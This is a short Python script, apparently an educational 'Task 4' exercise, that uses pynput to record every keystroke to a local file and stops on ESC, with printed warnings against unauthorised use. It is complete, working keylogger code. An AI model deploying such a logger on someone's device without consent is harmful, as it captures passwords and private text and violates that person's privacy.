# Task 4: Simple Keylogger
# IMPORTANT: This tool is for educational purposes ONLY.
# Do NOT use on systems you do not own or have explicit permission to monitor.
# Unauthorized keylogging is illegal and unethical.

from pynput import keyboard
import os

# Define the log file path
# It's good practice to log to a specific file within your project or a designated log directory
LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function for when a key is pressed.
    """
    try:
        # For alphanumeric keys, just append the character
        log_message = f"{key.char}"
    except AttributeError:
        # For special keys (e.g., space, enter, shift), append their name
        # Special handling for space to make the log more readable
        if key == keyboard.Key.space:
            log_message = " "
        elif key == keyboard.Key.enter:
            log_message = "[ENTER]\n" # Add newline for readability
        elif key == keyboard.Key.backspace:
            log_message = "[BACKSPACE]"
        else:
            log_message = f"[{key.name.upper()}]" # Convert key name to uppercase for clarity

    with open(LOG_FILE, "a") as f:
        f.write(log_message)

def on_release(key):
    """
    Callback function for when a key is released.
    This function can also be used to stop the listener.
    """
    # Example: Stop listener on 'esc' key release
    if key == keyboard.Key.esc:
        print(f"\n[Keylogger stopped by ESC key. Log saved to {LOG_FILE}]")
        return False # Stop the listener

def start_keylogger():
    """
    Starts the keyboard listener.
    """
    print(f"[*] Starting keylogger. All keystrokes will be saved to '{LOG_FILE}'")
    print("[*] Press ESC to stop the keylogger.")

    # Create a listener that calls on_press for key presses and on_release for key releases
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() # Join the listener thread to the main thread, keeping the script alive

# --- Main execution block ---
if __name__ == "__main__":
    print("--------------------------------------------------")
    print("WARNING: This is an educational tool for Task 4.")
    print("         Do NOT use without explicit permission.")
    print("--------------------------------------------------")
    start_keylogger()
